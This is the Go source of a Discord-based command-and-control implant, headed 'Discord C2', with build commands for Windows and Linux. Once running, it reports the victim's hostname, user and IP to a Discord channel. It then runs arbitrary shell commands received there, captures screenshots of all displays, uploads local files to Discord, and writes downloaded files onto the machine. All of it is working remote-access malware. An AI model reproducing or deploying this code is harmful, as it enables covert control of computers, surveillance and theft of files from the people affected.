// Discord C2
// William Moody
// 08.12.2022

// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
// 📸                - Take a screenshot
// 👇 <path>         - Download the given file (Less than 8MB)
// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
// 💀                - Kill the process

// Linux   - GOOS=linux GOARCH=amd64 go build client.go
// Windows - GOOS=windows GOARCH=amd64 go build client.go

package main

import (
	"bufio"
	"fmt"
	"image/png"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
)

var myChannelId string
var guildID string

func loadEnvFile(path string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if len(line) == 0 || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])
		if len(key) == 0 {
			continue
		}
		os.Setenv(key, value)
	}
}

func getOrCreateCategory(s *discordgo.Session, name string) (string, error) {
	channels, err := s.GuildChannels(guildID)
	if err != nil {
		return "", err
	}
	for _, ch := range channels {
		if ch.Type == discordgo.ChannelTypeGuildCategory && ch.Name == name {
			return ch.ID, nil
		}
	}
	cat, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
		Name: name,
		Type: discordgo.ChannelTypeGuildCategory,
	})
	if err != nil {
		return "", err
	}
	return cat.ID, nil
}

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignores messages in other channels and own messages
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐") // Processing...
	flag := 0

	//Run command
	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
		} else {
			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		// Message is too long, save as file
		if len(out) > 2000-13 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(string(out) + "\n")
			resp.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
		}
		flag = 1
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, _ := screenshot.CaptureRect(bounds)

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, _ := os.Create(fileName)
			png.Encode(file, img)
			defer file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		fileName := m.Content[5:len(m.Content)]
		f, _ := os.Open(fileName)
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 { // 8MB file limit
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		path := m.Content[7:len(m.Content)]
		if len(m.Attachments) > 0 {
			out, _ := os.Create(path)
			defer out.Close()
			resp, _ := http.Get(m.Attachments[0].URL)
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
		}
		flag = 1
	} else if m.Content == "💀" {
		flag = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

func main() {
	loadEnvFile(".env")
	guildID = os.Getenv("DISCORD_GUILD_ID")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" || guildID == "" {
		return
	}
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		// Error creating Discord session
		return
	}

	// Handler for CreateMessage events
	dg.AddHandler(handler)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		// Error opening connection
		return
	}

	// Create new channel
	rand.Seed(time.Now().UnixNano())
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ipStr := localAddr.IP.String()
	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()
	var categoryName string
	switch runtime.GOOS {
	case "windows":
		categoryName = "Windows"
	case "linux":
		categoryName = "Linux"
	case "darwin":
		categoryName = "Mac"
	default:
		categoryName = "Other"
	}
	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		return
	}
	channelName := fmt.Sprintf("%s-%s-%s",
		strings.ToLower(hostname),
		strings.ToLower(currentUser.Username),
		strings.ReplaceAll(ipStr, ".", "-"),
	)
	c, err := dg.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
		Name:     channelName,
		Type:     discordgo.ChannelTypeGuildText,
		ParentID: categoryID,
	})
	if err != nil {
		return
	}
	myChannelId = c.ID

	// Send first message with basic info (and pin it)
	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Bot is now running (CTRL+C to quit)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}
